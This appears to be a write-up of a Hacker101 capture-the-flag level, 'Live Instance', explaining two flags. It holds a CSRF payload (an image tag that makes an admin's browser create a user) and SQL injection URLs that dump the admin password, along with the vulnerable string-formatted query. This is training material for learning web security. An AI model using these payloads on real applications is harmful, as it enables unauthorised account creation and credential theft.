---
title: Live Instance
published: true 
tags: Hacker101
---

# Flag 0

### Hints:
* This level and the Ticketastic demo instance are running the same code
* Take a look at addUser on the demo instance
* What is missing?
* Humans might read these tickets and interact with them
* Links in tickets could be interesting

```html
<form method="GET">
    Username: <input type="text" name="username"><br>
    Password: <input type="password" name="password"><br>
    Repeat password: <input type="password" name="password2"><br>
    <input type="submit" value="Create">
</form>
```

If both instances run on the same code then in live instance also is missing csrf token. So it should be possible trick browswer to send request to newUser endpoint. If currently loggen user will has admin priviliges then new user will be created. To achive thath, create ticket with this title and body:

```html
<img src="http://localhost/newUser?username=1test1&password=test&password2=test">
```

submit, wait a minute then login in with those credentials. Flag is in ticket "Flag Won't Work"

![Flag](assets/live_instance/flag0/flag.png)

More about this vulnerability you can read [here](https://owasp.org/www-community/attacks/csrf).

* * *

# Flag 1

###  Hints:
* How do others log into this instance?
* The login form reveals more than it should
* So does the ticket endpoint

Tickets have id number, by manipulating that param is possible to exploit SQL injection because system respond with an error message to query where id has additional apostrophe. Original query to database:

![Error message](assets/live_instance/flag1/sql_error.png)

```python
cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
```

So there must be way to exploit this vulnerability. As first step I try to control data presented on the page. With following query it is possible:

```
http://34.74.105.127/74d469a935/ticket?id=111%20union%20select%20%271%27,%271%27,%271%27%20#
```

![Data controll](assets/live_instance/flag1/page_result.png)

After reading hints I guess the second flag is somewhere in users table, probably it is connectected with admin. So I check it out

![Flag](assets/live_instance/flag1/flag.png)

and I was right, flag is admin passwod. 

```
http://34.74.105.127/74d469a935/ticket?id=111%20union%20select%20username,password,%271%27%20from%20users%20where%20username=%27admin%27;select%20%271
```

That query used to read flag. 